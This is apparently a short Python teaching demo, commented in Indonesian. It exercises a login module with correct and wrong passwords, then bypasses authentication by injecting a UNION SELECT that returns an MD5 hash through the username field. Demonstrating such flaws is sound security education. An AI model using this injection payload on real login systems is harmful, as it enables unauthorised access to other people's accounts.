import hashlib

from akun import daftar, login

daftar("dr.sari", "Rahasia#2026")
print("password benar :", login("dr.sari", "Rahasia#2026"))
print("password salah :", login("dr.sari", "tebak-tebak"))
print("username asal  :", login("siapa", "x"))

# Penyerang tidak tahu password siapa pun. Ia menyisipkan SQL lewat kolom username.
md5_x = hashlib.md5(b"x").hexdigest()
print("injeksi SQL    :", login(f"bukan-siapa-siapa' UNION SELECT '{md5_x}' --", "x"))
